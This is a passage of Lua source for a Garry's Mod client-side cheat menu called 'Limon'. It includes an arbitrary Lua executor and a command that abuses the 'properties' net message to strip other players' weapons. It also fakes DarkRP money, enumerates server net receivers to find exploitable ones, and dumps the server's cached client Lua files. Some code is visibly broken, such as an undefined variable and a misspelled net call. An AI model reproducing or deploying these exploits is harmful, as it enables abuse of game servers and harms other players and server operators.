self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')") 	
end  	
function PANEL:GotoLine(num) 		
self:CallJS("GotoLine('" .. num .. "')") 	
end  	
function PANEL:ClearGutter() 		
self:CallJS("ClearErr()") 	
end  	
function PANEL:GotoErrorLine() 		
self:GotoLine(self.ErrorLine || 1) 	end  	
function PANEL:SetError(err) 		
if !IsValid(self.HTML) then 			
self.ErrorPanel:SetText("") 			
self:ClearGutter() 			
return 		end  		
local tall = 0  		
if err then 			
local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")  			
if line && err then 				
tall = 20  				
self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "") 				
self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1 				
self:SetGutterError(self.ErrorLine,err) 			end 		else 			
self.ErrorPanel:SetText("") 			self:ClearGutter() 		end  		
local wide = self:GetWide() 		
local tallm = self:GetTall()  		
self.ErrorPanel:SetPos(0,tallm - tall) 		
self.ErrorPanel:SetSize(wide,tall) 		
self.HTML:SetSize(wide,tallm - tall) 	
end  	
function PANEL:ValidateCode() 		
local time = SysTime() 		
local code = self:GetCode()  		
self.NextValidate = nil  		
if !code || code == "" then 			
self:SetError() 			
return 		
end  		
local errormsg = CompileString(code,self.COMPILE,false) 		
time = SysTime() - time  		
if type(errormsg) == "string" then 			
self:SetError(errormsg) 		
elseif time > 0.25 then 			
self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")") 		
else 			
self:SetError() 		
end 	
end  	
function PANEL:PerformLayout(w,h) 		
local tall = self.ErrorPanel:GetTall()  		
self.ErrorPanel:SetPos(0,h - tall) 		
self.ErrorPanel:SetSize(w,tall)  		
self.HTML:SetSize(w,h - tall) 	end   	
vgui.Register("lua_executer",PANEL,"EditablePanel")  	
local menu = vgui.Create('DFrame') 	
menu:SetSize(ScrW()/2,ScrH()/2) 	
menu:SetTitle('LUA Executer') 	
menu:Center() 	
menu:SetSizable(true) 	
menu:MakePopup() 	
menu:ShowCloseButton(false) 	
menu.Paint = function(self,w,h) 		
surface.SetDrawColor(30,30,30) 		
surface.DrawRect(0, 0, w, 25) 		 		
surface.SetDrawColor(0,0,0) 		
surface.DrawRect(0, 25, w, h-25) 	
end  	
local clos = vgui.Create("DButton", menu) 	
clos:SetSize(40,23) 	
clos:SetText("") 	
clos.Paint = function(self,w,h) 		
surface.SetDrawColor(196,80,80) 		
surface.DrawRect(0,0,w,h) 		
surface.SetFont("marlett") 		
local s,s1 = surface.GetTextSize("r") 		
surface.SetTextPos(w/2-s/2,h/2-s1/2) 		
surface.SetTextColor(255,255,255) 		
surface.DrawText("r") 	end 	
clos.DoClick = function() 		
menu:SetVisible(!menu:IsVisible()) 	
end  	
local ed = vgui.Create('lua_executer', menu) 	
ed:SetPos(5, 55)  	
menu.PerformLayout = function(self, w, h) 		
clos:SetPos(w-41, 1) 		
ed:SetSize(w-10, h-60) 	
end  	
local offset = 5  	
local function CreateBtn(wide, text, icon, fn) 		
local mt = Material(icon) 		
local btn = vgui.Create('DButton', menu) 		
btn:SetText('') 		
btn.Paint = function(self,w,h) 			
if self.Hovered then 				
if self.Depressed then 					
surface.SetDrawColor(90,90,90) 				
else 					
surface.SetDrawColor(70,70,70) 				
end 		
else 				
surface.SetDrawColor(40,40,40) 			
end 		 			
surface.DrawRect(0,0,w,h) 			
surface.SetDrawColor(255,255,255) 		
surface.SetMaterial(mt) 			
surface.DrawTexturedRect(5,h / 2 - 8,16,16) 			
draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1) 		
end 		
btn.DoClick = fn 		
btn:SetSize(wide, 20) 		
btn:SetPos(offset, 30) 		
offset=offset + wide + 5 	end  	
CreateBtn(115, "Send LUA", 'icon16/arrow_down.png', function() 		
local code = ed:GetCode() 		
RunString(code) 	
end) 	 	 	
end 
concommand.Add('L_luarun', executer)


concommand.Add("strip",function()
	chat.AddText(Color(255,0,0,255),"Stripping Players Of Wepons(Possibly Failed)")

	local players=player.GetAll()
	local k=0
	timer.Create("remove_weapons",0.1,0,function()
		local ply=players[k]
		if ply and ply:IsValid() then
			for x,weapon in pairs(v:GetWeapons()) do
				print("Removed "..weapon:GetClass().." from "..ply:Nick())
				net_Start("properties")
				net.WriteString("remove",32)
				net.WriteEntity(weapon)
				net.SendToServer()
			end
		end
	end)
end)

if DarkRP then
local desMon = 0
local ply = LocalPlayer()
local DarkRPVars = {}
local gamsTab = {}
local stgs = {}
local adng = nil
local stgTm = CurTime()
local lmd = .001
local stgNm = 1
local slideVal = 0
local dotTm = CurTime()
local dotNm = 0

local function bUnPack(dat)
	local datTab = string.Split(dat, ":|:")
	local monTab = {}
	for k,v in pairs(datTab) do
		table.insert(monTab, string.Split(v, ":-:"))
	end
	return monTab
end

local function bPack(tab)
	local gamStrs = {}
	for k,v in pairs(tab) do
		table.insert(gamStrs, v[1]..":-:"..v[2])
	end
	local datStr = ""
	for k,v in pairs(gamStrs) do
		if datStr == "" then
			datStr = v
		else
			datStr = datStr..":|:"..v
		end
	end
	return datStr
end

local function saveMon()
	if gamsTab ~= {} then
		file.Write("smn.txt", bPack(gamsTab))
	end
end

--Load Money
local function loadMon()
	if not file.Exists("smn.txt", "DATA") then return end
	return bUnPack(file.Read("smn.txt", "DATA"))
end

if loadMon() then
	gamsTab = loadMon()
	for k,v in pairs(gamsTab) do
		if v[1] == game.GetIPAddress() then
			desMon = v[2]
		end
	end
end
local function displayAmt(amt)
	local txt = DarkRP.getPhrase("payday_message", "$"..tostring(amt))
    GAMEMODE:AddNotify(txt, 4, 4)
    surface.PlaySound("buttons/lightswitch2.wav")
    MsgC(Color(255, 20, 20, 255), "[DarkRP] ", Color(200, 200, 200, 255), txt, "\n")

end

local function addMoney(money, dspl)
	local dspl = dspl or true
	local mon = tonumber(money)
	desMon = math.floor(desMon + mon)
	if dspl then
		displayAmt(mon)
	end
	local hasVal = false
	for k,v in pairs(gamsTab) do
		if v[1] == game.GetIPAddress() then
			hasVal = k
		end
	end
	if hasVal then
		table.remove(gamsTab, hasVal)
	end
	table.insert(gamsTab, {game.GetIPAddress(), desMon})
	saveMon()
end

--Set Money
local function setMoney(ply, cmd, money)
	local nw, rl = ply:getDarkRPVar("money")
	if money[1] == "rl" then
		addMoney(-desMon, false)
	else
		local mon = tonumber(money[1])
		addMoney((-desMon) + (mon - rl), false)
	end
end
concommand.Add("Limon_setmoney", setMoney)

hook.Add("Think", "VarChange", function()
	if DarkRPVars then
		local nw, rl = ply:getDarkRPVar("money")
		if not (nw and rl) then return end
		hook.Run("DarkRPVarChanged", LocalPlayer(), "money", nil, nw)
	end

	if adng ~= nil and stgs ~= {} then
		local bar = adng[1] 
		local rchTxt = adng[2]
		local frame = bar:GetParent()
		if stgTm < CurTime() then
			stgNm = stgNm + 1
			stgTm = CurTime() + stgs[stgNm].tm
		else
			bar:SetFraction(stgNm/table.Count(stgs))
			rchTxt:SetText("")
			rchTxt:InsertColorChange(150,20,20,255)
			rchTxt:AppendText(stgs[stgNm].nm..(string.rep(".",dotNm,"")))
		end

		if stgNm == table.Count(stgs) then
			addMoney(slideVal)
			frame:Close()
			stgs = {}
			adng = nil
			stgNm = 1
		end
		if dotTm < CurTime() then
			dotTm = CurTime() + 1/5
			dotNm = dotNm + 1
			if dotNm > 4 then
				dotNm = 0
			end
		end
	end
end)

local pmeta = FindMetaTable("Player")
function pmeta:oldFunc(var)
    local vars = DarkRPVars[self:UserID()]
    return vars and vars[var] or nil
end

function pmeta:getDarkRPVar(var)
	if var == "money" and self == ply and ply:oldFunc(var) ~= nil then
		return self:oldFunc(var) + desMon, self:oldFunc(var)
	else
		return self:oldFunc(var)
	end
end

local function RetrievePlayerVar(userID, var, value)
    local ply = Player(userID)
    DarkRPVars[userID] = DarkRPVars[userID] or {}

    hook.Call("DarkRPVarChanged", nil, ply, var, DarkRPVars[userID][var], value)
    DarkRPVars[userID][var] = value
    if IsValid(ply) then
        ply.DarkRPVars = DarkRPVars[userID]
    end
end


local function doRetrieve()
    local userID = net.ReadUInt(16)
    local var, value = DarkRP.readNetDarkRPVar()

    RetrievePlayerVar(userID, var, value)
end
net.Receive("DarkRP_PlayerVar", doRetrieve)


local function doRetrieveRemoval()
    local userID = net.ReadUInt(16)
    local vars = DarkRPVars[userID] or {}
    local var = DarkRP.readNetDarkRPVarRemoval()
    local ply = Player(userID)

    hook.Call("DarkRPVarChanged", nil, ply, var, vars[var], nil)

    vars[var] = nil
end
net.Receive("DarkRP_PlayerVarRemoval", doRetrieveRemoval)

local function InitializeDarkRPVars(len)
    local plyCount = net.ReadUInt(8)

    for i = 1, plyCount, 1 do
        local userID = net.ReadUInt(16)
        local varCount = net.ReadUInt(DarkRP.DARKRP_ID_BITS + 2)

        for j = 1, varCount, 1 do
            local var, value = DarkRP.readNetDarkRPVar()
            RetrievePlayerVar(userID, var, value)
        end
    end
end
net.Receive("DarkRP_InitializeVars", InitializeDarkRPVars)
timer.Simple(0, fp{RunConsoleCommand, "_sendDarkRPvars"})

net.Receive("DarkRP_DarkRPVarDisconnect", function(len)
    local userID = net.ReadUInt(16)
    DarkRPVars[userID] = nil
end)


timer.Create("GetVars", 3, 0, function()
    for _, v in ipairs(player.GetAll()) do
        if v:getDarkRPVar("rpname") then continue end

        RunConsoleCommand("_sendDarkRPvars")
        return
    end

    timer.Remove("GetVars")
end)
end



function Limon_nethack()
local Limon = vgui.Create( "DFrame" )
Limon:SetSize( 1173, 427 )
Limon:Center()
Limon:SetTitle( "" )
Limon:SetVisible( true )
Limon:SetDraggable( true )
Limon:ShowCloseButton( false )
Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
	surface.SetDrawColor( 255,255,5, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

	draw.RoundedBox( 0, 0, 0, 3000, 22, Color(255,255,5) )
	draw.SimpleText("Limon - all res", 'Limon_15', 5, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(1150, 1)
	Limon_b:SetSize( 22, 20 )	
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

local AppList = vgui.Create( "DListView", f )
AppList:SetPos( 2, 24 )
AppList:SetSize(895, 400)
AppList:SetMultiSelect( true )
AppList:SetParent( Limon )
local cin = AppList:AddColumn("Клиент")
local cout = AppList:AddColumn("")
cin:SetFixedWidth(200)
cout:SetFixedWidth(700)
for _,a in SortedPairs(net.Receivers,!1) do
AppList:AddLine( _, debug.getinfo(a)["short_src"] )
end
local AppList1 = vgui.Create( "DListView", f )
AppList1:SetPos( 900, 24 )
AppList1:SetSize(270, 400)
AppList1:SetMultiSelect( true )
AppList1:SetParent( Limon )
local cin1 = AppList1:AddColumn("Сервер")
cin1:SetFixedWidth(270)
for b = 0,65536 do
local c = util.NetworkIDToString(b)
if c&&c~=""then
if!net.Receivers[c]then
AppList1:AddLine(c)
end
end
end
end

MsgC(Color(255, 214, 41),[[
LIMON ACTIVATED
]])

function block_net_limon()
net.Start = function(text) MsgC(Color (255, 214, 41), "[", "Limon", "] ", Color( 255, 255, 255 ), "Заблокирован net "..text.." \n") end
oldnetstart = function(text) MsgC(Color (255, 214, 41), "[", "Limon", "] ", Color( 255, 255, 255 ), "Заблокирован net "..text.." \n") end
end



--------------------------------------------------------------
for k,v in pairs(file.Find("bin/gmcl_stringtablesex_win32.dll", "LuaMenu")) do
require("stringtablesex")
local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } 
function string.JavascriptSafe( str ) 
	str = str:gsub( ".", escapejs ) 
	str = str:gsub( "\226\128\168", "\\\226\128\168" )
	 str = str:gsub( "\226\128\169", "\\\226\128\169" ) 
	 return str 
	end 
local function GetLuaFiles(client_lua_files) 
	local count = client_lua_files:Count() 
	local ret = {} 
	for i = 1, count - 2 do 
		ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } 
	end 
	return ret 
end 
local function GetLuaFileContents(crc) 
	local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) 
	local contents = util.Decompress(fs:Read(fs:Size() - 4)) 
	return contents:sub(1, -2) 
end 
local function dumbFile(path, contents) 
	if not  path:match("%.lua$") then 
		path = path..".lua" 
	end 
local curdir = "" 
for t in path:gmatch("[^/\\*]+") do 
	curdir = curdir..t 
	if  curdir:match("%.lua$") 
		then 
		print("writing: ", curdir) 
		file.Write(curdir, contents) 
	else curdir = curdir.."/" 
		print("Creating: ", curdir) 
		file.CreateDir(curdir) 
	end 
end 
end 
local dumbFolderCache = "" 
local function dumbFolder(node) 
	for _, subnode in ipairs(node.ChildNodes:GetChildren()) do 
	if subnode:HasChildren() then 
		dumbFolder(subnode) 
	else 
		dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) 
	end 
end 
end

local VIEWER2 = {}

function VIEWER2:Init()
  self:SetTitle("")
  self:SetSize(1200, 550)
  self:Center() self:ShowCloseButton( false ) 
	self.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
	surface.SetDrawColor( 255,255,5, 255 )
    surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )

	draw.RoundedBox( 0, 0, 0, 3000, 22, Color(255,255,5) )
	draw.SimpleText("Limon - client side", 'Limon_15', 5, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( self )
	Limon_b:SetText( "" )
	Limon_b:SetPos(1177, 1)
	Limon_b:SetSize( 22, 20 )	
	Limon_b.DoClick = function()
    self:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end 
  
 self.tree = vgui.Create("DTree", self) 
self.tree:SetPos(5,25) 
self.tree:SetSize(250,520) 
self.tree.Directories = {} 
self.html = vgui.Create("DHTML", self) 
self.html:SetPos(260,27) 
self.html:SetSize(935,517) 
self.html:OpenURL("http://metastruct.github.io/lua_editor/") 
client_lua_files = stringtable.Get "client_lua_files" 
local tree_data= {} for i, v in ipairs(GetLuaFiles(client_lua_files)) do 
if i == 1 then 
	continue 
end 
local file_name = string.match(v.Path, ".*/([^/]+%.lua)") 
local dir_path = string.sub(v.Path, 1, -1 - file_name:len()) 
local file_crc = v.CRC 
local cur_dir = tree_data 
for dir in string.gmatch(dir_path, "([^/]+)/") do 
	if not cur_dir[dir] then 
		cur_dir[dir] = {} 
	end cur_dir = cur_dir[dir] 
end 
cur_dir[file_name] = {fileN = file_name, CRC = file_crc} 
end 
local file_queue = {} 
local function iterate(data, node, path) 
	path = path or "" 
	for k, v in SortedPairs(data) do 
		if type(v) == "table" and not v.CRC then 
			local new_node = node:AddNode(k) 
			new_node.DoRightClick = function() 
				local dmenu = DermaMenu(new_node) 
				dmenu:SetPos(gui.MouseX(), gui.MouseY()) 
				dmenu:AddOption("НЕ РОБИТ!", function() 
					dumbFolderCache = "cluaview/"..GetHostName()..dumbFolder(new_node) 
					DrawFancyPopup("ЭТО ".. dumbFolder(new_node) .." ДАВНО".. GetHostName() .."ПОФИКСИЛИ".. dumbFolder(new_node) .."!") 
				end) 
				dmenu:Open() 
			end iterate(v, new_node, path .. k .. "/") 
		else table.insert(file_queue, {node = node, fileN = v.fileN, path = path .. v.fileN, CRC = v.CRC}) 
		end 
	end 
end 
iterate(tree_data, self.tree) for k, v in ipairs(file_queue) do 
local node = v.node:AddNode(v.fileN, "icon16/page_green.png") 
node.DoClick = function() 
	self.html:QueueJavascript("SetContent('"..string.JavascriptSafe(GetLuaFileContents(v.CRC)).."')") 
end 
local hostname = GetHostName() 
hostname = hostname:gsub("|", "-") 
hostname = hostname:gsub("~", "-") 
hostname = hostname:gsub(" ", "") 
node.DoRightClick = function(self,node) 
	local nodemenu = DermaMenu(node) 
	nodemenu:AddOption("Не робит", function() dumbFile("cluaview/".. string.lower(hostname) .."/"..v.fileN, GetLuaFileContents(v.CRC)) DrawFancyPopup("The file ".. v.fileN .." has been saved as data/cluaview/".. string.lower(hostname) .."/".. v.fileN .."!") 
	end) 
	nodemenu:Open() 
end node.CRC = v.CRC node.pathh = v.path

    end

  end

derma.DefineControl("chmluaviewer", "Anus Lua Viewer", VIEWER2, "DFrame")

concommand.Add("lua_view", function() vgui.Create("chmluaviewer"):MakePopup() end)
end
-------------------------------------------------------------------
